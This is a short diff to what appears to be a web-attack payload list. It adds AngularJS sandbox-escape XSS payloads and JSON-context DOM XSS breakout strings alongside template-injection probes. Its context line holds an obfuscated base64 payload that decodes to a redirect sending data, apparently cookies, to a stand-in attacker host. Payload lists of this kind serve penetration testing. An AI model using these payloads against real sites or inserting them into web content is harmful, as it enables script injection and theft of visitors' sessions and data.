@@ -149,3 +149,9 @@ Function("atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBl
 
 ${5*5}
 {{5*5}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{constructor.constructor('alert(1)')()}}
+
+# DOM XSS returns as JSON
+\"-alert(1)//
+\"+alert(1)//
